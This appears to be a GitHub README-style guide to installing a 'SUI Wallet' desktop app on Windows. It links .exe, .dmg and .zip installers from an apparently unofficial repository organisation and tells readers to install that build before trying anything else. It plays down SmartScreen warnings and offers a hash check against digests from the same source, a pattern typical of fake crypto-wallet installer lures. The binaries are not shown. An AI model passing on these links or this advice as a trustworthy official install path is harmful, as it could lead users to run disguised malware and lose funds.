![SUI Wallet](assets/banner-article.png)

# How to install SUI Wallet on Windows

Take the Windows .exe from the release page and open the app on a 64-bit Windows 10 or 11 machine.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

On Windows, SUI Wallet is a single installer taken from the project's [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest), built for 64-bit
Windows 10 (1909) or later. Download it, check it against the digest published beside it, run it, and
choose Create or Restore on the welcome screen. The wallet is actively maintained, and the current
release is always on the release page.

## Which file to take on Windows

The Windows build is one `.exe`. The release page lists it with the macOS and Linux files, so the first
job is picking the right one: an installer that ends in `.exe` belongs to Windows, and nothing else on
that page does.

Three details decide whether the file will run:

- **Windows 10 build 1909 or later, 64-bit.** Anything older, or a 32-bit install, is outside the
  published requirement; the system requirements page sets out all three platforms.
- **The current release, not an older download.** Links circulate in videos, forums and chat groups, and
  an installer from last year is the most common reason a first install behaves unlike the guides.
- **One file.** The three assets on the release page are the whole download; nothing else has to be
  installed first.

If you are choosing between a desktop app and something else entirely, the comparison of the three files
on the release page is in [SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md).

## Check the download before you run it

Every release publishes a SHA-256 digest for each of its three files. Comparing the file you downloaded against the published value takes one command and settles whether the installer is the one the project built, before anything runs with your permissions.

Windows can produce the value itself: in PowerShell, run `Get-FileHash` on the file you downloaded with
`-Algorithm SHA256`. The output is a 64-character string, and it should match the digest printed beside
the Windows asset in the release notes, character for character. A mismatch means the file did not
arrive intact, or did not come from the release page at all - delete it and download again from
[current release](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

This check matters more than it looks. A modified installer is the cheapest attack on a wallet: it runs
before any wallet code exists, so nothing inside the app can warn you. The digest is the only part of the
download that a copy cannot fake.

## Running the installer

The installer asks for very little, and the defaults are the right answer for most people. Confirm the location it offers, run it, and then launch the app from the shortcut it creates rather than from the file you downloaded - the download is an installer, not the application.

Windows may show a SmartScreen panel on first run, because the file is new and not yet widely
downloaded. That panel is about reputation, not about the file being wrong - check the digest first, then
choose the option that runs it. The SmartScreen guide covers the panel wordings one at a time, including
the case where the button that runs the file is greyed out.

Closing the window is not uninstalling: the application stays installed until you remove it, which is a
separate job from running it.

## First run: create or restore

The app opens on a welcome screen that offers two paths, and the choice is the whole decision of a first run. Create makes a new account and shows a 24-word recovery phrase once. Restore takes 24 words you already hold and derives the accounts behind them.

Neither path asks for an email address, a phone number or an account with a server. The phrase is the
account. Write it down before you fund anything, and read the phrase screen carefully rather than
clicking through it: [SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) covers what the app does with those words
and why the order matters.

If you are restoring rather than creating, the app shows the addresses it found before it reports a
successful restore. That detail matters when a phrase is right but the account you expected does not
appear, and it is the whole subject of the restoring guide.

## Two screens worth knowing on the first day

Nothing in the wallet is hidden, but two screens do the work that support threads otherwise do: the Help entry, which opens the troubleshooting pages for the account you are using, and the diagnostics panel, which names the version, the network and the last transaction digest.

- **Help** opens this project's own troubleshooting pages, so a problem can be read about inside the app
  rather than in a search engine.
- **Diagnostics** shows the app version, the network the wallet is on, and the digest of the last
  transaction the wallet handled. That panel is what makes a support question answerable: it names the
  build and the exact transaction instead of describing them.

## If the app will not start

Most first-launch failures are one of three things: a build older than the current release, a block
screen the reader dismissed instead of allowed, or a missing system component on a machine below the
published requirement. Work through them in that order - update first, then the block screen, then the
requirement.

[SUI Wallet won't open after install](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-wont-open-after-install.md) takes each cause in turn and says what the app shows in
each case, including the diagnostics line that identifies a build too old to have the current screens.

## Keeping the install current

The changelog lists one line per release, newest first, and the release page carries the file. When a guide describes a screen you cannot find, the usual reason is that the installed build predates it, so the comparison between changelog and build is the first thing to make.

Updating means running the current installer. The phrase does not change, because it belongs to the
account rather than to the build, and removing the wallet first is a removal, not an update.

## FAQ

### Does installing on Windows need administrator rights?

The installer runs from the file you downloaded and asks Windows for what it needs. After that the
wallet opens like any other desktop application, with no service left behind.

### Can I install the same wallet on a second Windows machine?

Yes. Install the current release there and choose Restore, then enter the 24 words. That is also why the
phrase, not the machine, is the thing to protect: the machine is replaceable, the words are not.

### Why does Windows warn me about the installer?

SmartScreen reacts to files that are new or rarely downloaded. It is a reputation signal, not a verdict
on this file. Check the SHA-256 digest against the release notes; if it matches, the file is the one the
project published.

### I downloaded from a search result and the app looks different. What now?

Uninstall it, change any password you entered into it, and treat the phrase as exposed if the app ever
showed or asked for one. Then install from the release page and move funds to a fresh account. The
phishing patterns are set out in the guide to avoiding fake download sites.

### Does the wallet need an internet connection?

Yes. The wallet reads balances and submits transactions to the Sui network, so the first useful session
happens online even though the installer itself is a local file.
